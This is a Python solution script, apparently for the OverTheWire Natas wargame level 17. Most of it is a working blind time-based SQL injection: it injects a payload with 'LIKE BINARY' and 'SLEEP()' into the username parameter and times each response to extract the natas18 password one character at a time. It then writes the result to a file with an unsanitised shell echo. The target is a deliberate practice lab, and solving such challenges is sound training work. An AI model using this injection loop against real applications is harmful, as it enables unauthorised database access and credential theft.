import requests, os, sys, time
from pwn import *
from requests.auth import HTTPBasicAuth
import urllib.parse
import string, signal

def get_password(user):
    file = open(f'credentials/{user}', 'r')
    password = file.read().replace('\n', '')
    file.close()
    return password


user = 'natas17'
password = get_password(user) 
url = f"http://{user}.natas.labs.overthewire.org"


def make_request(username):
    auth = HTTPBasicAuth(user, password)
    res = requests.get(url, auth=auth, params={ 'debug': 'true', 'username': username  })
    return res.text


def force_brute_attack():
    
    characters = f'{string.ascii_letters}{string.digits}'
    natas18_pass = ''
    sleep_time = 3 

    attack_progress = log.progress('Brute force attack blind time based sql injection')
    attack_progress.status('Starting attack')
    password_progress = log.progress('Password for natas17')
    
    while True:
        found = False
        for c in characters:
            
            attack_progress.status(f'trying with {c} character')
            injection = f'natas18" AND password LIKE BINARY "{natas18_pass}{c}%" AND SLEEP({sleep_time}) #'
            start_time = time.time()
            res = make_request(injection)
            end_time = time.time()
            time_elapsed = end_time - start_time
            
            if time_elapsed >= sleep_time:
                natas18_pass += c
                password_progress.status(natas18_pass)
                found = True
                break

        if found == False:
            break
    
    attack_progress.success(f'Password found {natas18_pass}')
    return natas18_pass


def def_handler(sig, frame):
    print('\n\n[*] Exit...\n')
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


if __name__ == "__main__":
    pass_found = force_brute_attack()
    os.system(f'echo "{pass_found}" > credentials/natas18')
    log.info('Password saved!')


